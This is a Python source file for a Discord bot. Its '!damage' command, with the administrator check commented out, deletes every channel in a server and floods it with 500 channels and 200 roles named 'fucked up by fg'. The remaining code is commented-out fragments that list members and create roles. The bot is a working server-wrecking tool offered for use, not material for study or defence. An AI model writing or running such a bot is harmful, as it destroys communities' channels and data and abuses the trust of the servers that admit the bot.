import discord
import os
from discord.ext import commands
from discord.ext.commands import has_permissions

intent = discord.Intents.all()
client = commands.Bot(command_prefix = '!', intent  = intent)

bot_token = TOKEN = os.getenv("DISCORD_TOKEN")

@client.event
async def on_ready():
  print('Bot is ready !')
  

@client.command(name = 'damage')
#@commands.has_permissions(administrator = True)
async def create(ctx):
  for c in ctx.guild.channels:
    await c.delete()
  for i in range(0, 500):
    await ctx.guild.create_text_channel('fucked up by fg')
  for i in range(0, 200):
    await ctx.guild.create_role(name = "fucked up by fg")

'''@client.command(name = 'restore')
async def delchannels(ctx):
    for c in ctx.guild.channels:
      await c.delete()
      
    await ctx.guild.create_text_channel('coding')'''


'''@client.command()
async def member(ctx):'''
'''x = member.guild.member_count
  names = member.guild'''

'''for guild in client.guilds:
    for member in guild.members:
      print(member)'''

'''member_list = ''
  for member in server.members:
    member_list += member.name
  print(member_list)
'''
'''@client.command(name = 'role')
@commands.has_permissions(manage_roles = True)
async def create_role(ctx):
  for i in range(0, 100):
    await ctx.guild.create_role(name = "sample")'''





client.run(bot_token)